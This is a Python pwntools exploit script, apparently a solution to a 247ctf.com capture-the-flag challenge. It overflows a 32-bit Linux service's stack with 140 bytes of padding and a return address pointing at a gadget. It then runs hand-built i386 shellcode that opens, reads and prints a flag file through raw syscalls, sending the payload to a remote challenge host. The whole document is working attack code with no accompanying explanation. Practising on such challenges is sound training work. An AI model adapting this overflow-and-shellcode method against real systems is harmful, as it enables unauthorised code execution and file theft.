#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

# Addresses
asm_bounce = 0x080484a6
offset = 140

# Filename: flag_27886b9a498ed936.txt
filename = b"flag_27886b9a498ed936.txt\x00"

# Build shellcode to cat the specific flag file
# We'll use a simpler approach - just read and write syscalls
shellcode = asm("""
    /* open("flag_27886b9a498ed936.txt", O_RDONLY) */
    xor eax, eax
    push eax
""")

# Push the filename in reverse (4 bytes at a time)
fname = b"flag_27886b9a498ed936.txt"
# Pad to multiple of 4
while len(fname) % 4 != 0:
    fname += b"\x00"

# Push in reverse order
for i in range(len(fname)-4, -1, -4):
    chunk = fname[i:i+4]
    val = u32(chunk)
    shellcode += asm(f"push {val}")

shellcode += asm("""
    mov ebx, esp
    xor ecx, ecx
    mov eax, 5
    int 0x80
    
    /* read(fd, buf, 100) */
    mov ebx, eax
    sub esp, 100
    mov ecx, esp
    mov edx, 100
    mov eax, 3
    int 0x80
    
    /* write(1, buf, count) */
    mov edx, eax
    mov ebx, 1
    mov eax, 4
    int 0x80
    
    /* exit(0) */
    xor ebx, ebx
    mov eax, 1
    int 0x80
""")

# Build payload
payload = b"A" * offset
payload += p32(asm_bounce)
payload += shellcode

# Connect to remote
r = remote('3674ee75fcb4540a.247ctf.com', 50270)

# Receive banner
r.recvuntil(b'though:\n')

# Send payload
r.sendline(payload)

# Get flag
time.sleep(0.5)
try:
    flag = r.recvall(timeout=2)
    print(f"\nFLAG: {flag.decode()}")
except Exception as e:
    print(f"Error: {e}")

r.close()
